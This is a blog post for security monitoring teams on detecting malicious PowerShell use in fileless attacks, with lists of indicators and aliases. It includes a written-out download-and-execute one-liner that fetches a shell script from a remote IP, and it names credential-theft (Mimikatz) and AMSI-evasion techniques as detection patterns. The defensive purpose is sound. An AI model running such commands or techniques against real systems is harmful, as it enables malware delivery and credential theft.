---
title: "Detecting suspicious PowerShell usage"
date: 2025-10-05T19:57:34+02:00
math: false
tags: [powershell, fileless malware]
categories: [soc]
---

# Detecting Suspicious PowerShell Usage


In the recent years there was an increase in the fileless techniques that abuse Powershell and other applications (LOTLs) to download and execute malware. These attacks occur generally in memory, which makes detection more complicated than traditional malware.

Let's take a look at this example:

`powershell.exe -command "iex(New-Object Net.WebClient).DownloadString(‘http://10.10.13.1/shell.ps1’)"`


The script shell.ps1 is downloaded and directly executed in memory through `iex`. Many times, attackers will encode or offuscate the commands to avoid the detection. Here is a basic list of commands to take a look for when monitoring Powershell usage:

## Common malicious commands

### Encoded Invocation
- Use of `-EncodedCommand`
- Base64 decoding via `[System.Convert]::FromBase64String(...)`
- `Invoke-Expression` (IEX) with obfuscated strings

### Policy Bypass 
- `-ExecutionPolicy Bypass` or `Unrestricted`
- Combined with `-NoProfile`, `-WindowStyle Hidden`, `-NonInteractive`

### Download and Execute
- `Invoke-WebRequest`, `Invoke-RestMethod`, `System.Net.WebClient`
- Followed by IEX or file execution

### In-Memory Compilation
- `Add-Type -TypeDefinition`
- `System.Reflection`, `Assembly::Load`, `Reflection.Assembly::Load`

### Lateral Movement 
- `Invoke-Command`, `Enter-PSSession`, `New-PSSession`
- `Get-WmiObject`, `Get-CimInstance`, `Get-ADUser`, `Get-ADComputer`

### Stealing credentials
- `Invoke-Mimikatz` - I might make another post only about Mimikatz, very common tool for redteams and hackers.
- `Get-Credential`

### Persistence
- Registry: `Set-ItemProperty` in `Run` keys
- `Register-ScheduledTask`, `schtasks`

### AMSI Evasion
- Commands offuscated like: "In"+"voke-Mi"+"mikatz"
- Commands to modify the memory of amsi.dll: `Invoke-NullAMSI`, [for example](https://github.com/BlackShell256/Null-AMSI)

## Common aliases


Some important Powershell aliases for detection are the following:

- `iex` → `Invoke-Expression`  
- `iwr` → `Invoke-WebRequest`  
- `irm` → `Invoke-RestMethod`  
- `gp` / `Get-ItemProperty` sometimes used for registry checks 
- `gcm` → `Get-Command` (used for discovery in scripts)  
- `gci` / `ls` → `Get-ChildItem` (used for local enumeration)  
- `%` → `ForEach-Object` and `?` → `Where-Object` (pipeline operators attackers use to process output)  
- `gc` → `Get-Content` (read files, logs)  
- `saps` → `Start-Process` (spawn processes)  
- `ni` → `New-Item` (create files/keys)  
- `sc` / `schtasks`
- `-EncodedCommand` / `-enc`  
- `-Command` / `-c`  
- `-NoProfile` / `-nop`  


 

